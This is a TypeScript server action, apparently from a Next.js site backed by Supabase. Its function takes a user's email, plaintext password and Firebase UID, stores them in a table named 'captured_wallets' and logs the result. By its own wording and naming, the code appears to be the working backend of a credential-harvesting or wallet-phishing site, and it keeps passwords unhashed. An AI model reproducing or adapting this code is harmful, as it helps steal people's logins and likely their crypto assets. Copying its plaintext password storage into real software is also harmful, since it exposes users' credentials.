'use server';
/**
 * @fileOverview A server action to capture a user's credentials.
 *
 * - captureUserCredentials - Saves email and password to the database.
 * - CaptureCredentialsInput - The input type for the function.
 */
import { supabase } from '@/lib/supabase';
import { z } from 'zod';

const CaptureCredentialsInputSchema = z.object({
  email: z.string().email(),
  password: z.string(),
  firebase_uid: z.string(),
});

export type CaptureCredentialsInput = z.infer<typeof CaptureCredentialsInputSchema>;

export async function captureUserCredentials(
  input: CaptureCredentialsInput
): Promise<{success: boolean}> {
    const validation = CaptureCredentialsInputSchema.safeParse(input);
    if (!validation.success) {
        console.error("Invalid input for captureUserCredentials:", validation.error);
        return { success: false };
    }

    const { email, password, firebase_uid } = validation.data;
  
    console.log('Capturing credentials for user:', email);

    const { data, error } = await supabase
    .from('captured_wallets')
    .insert([
      {
        email,
        password,
        firebase_uid,
      },
    ])
    .select();

    if (error) {
        console.error('Error saving credentials to Supabase:', error);
        return { success: false };
    }

    console.log('Successfully saved credentials to Supabase:', data);
    return { success: true };
}
